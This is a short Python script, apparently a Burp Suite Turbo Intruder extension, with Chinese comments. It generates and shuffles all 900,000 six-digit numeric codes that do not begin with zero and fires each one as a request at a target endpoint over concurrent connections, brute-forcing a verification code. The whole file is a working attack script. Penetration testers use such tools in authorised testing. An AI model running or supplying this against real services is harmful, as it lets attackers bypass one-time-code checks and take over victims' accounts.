from itertools import product
from random import shuffle

def brute_verify_code(target, engine, length):
    pattern = '1234567890'
    all_combinations = list(product(pattern, repeat=length))
    shuffle(all_combinations)
    # 生成一个新的列表，包含所有不以0开头的组合
    valid_combinations = [ ''.join(combo) for combo in all_combinations if combo[0] != '0' ]
    
    for code in valid_combinations:
        engine.queue(target.req, code)
        
    # with open("./code.txt", 'w+') as f:
    #     for code in valid_combinations:
    #         f.write(code + '\n')
            # print(code)


def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           requestsPerConnection=100,
                           pipeline=False
                           )
    brute_verify_code(target, engine, 6) # 六位验证码

def handleResponse(req, interesting):
    if interesting:
        table.add(req)
